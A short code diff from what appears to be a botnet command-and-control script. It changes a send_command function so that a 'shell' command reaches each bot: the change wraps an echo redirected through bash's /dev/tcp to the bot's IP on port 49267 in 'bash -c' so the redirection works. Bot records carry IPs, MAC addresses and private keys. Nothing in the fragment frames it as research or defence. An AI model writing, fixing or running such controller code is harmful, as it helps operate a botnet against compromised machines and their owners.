@@ -196,7 +196,7 @@ def send_command(bot, command):
     bot_id, bot_ip, bot_port, mac_address, description, public_key, private_key = bot
     if command == 'shell':
         # Use subprocess to run the echo command
-        subprocess.run(f'echo "shell" >&/dev/tcp/{bot_ip}/49267 0>&1', shell=True)
+        subprocess.run(f'bash -c \'echo "shell" >&/dev/tcp/{bot_ip}/49267 0>&1\'', shell=True)
         print(f'Sent command: {command} to bot at {bot_ip}')  # Debugging statement
     #bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #bot_socket.connect((bot_ip, int(49266)))
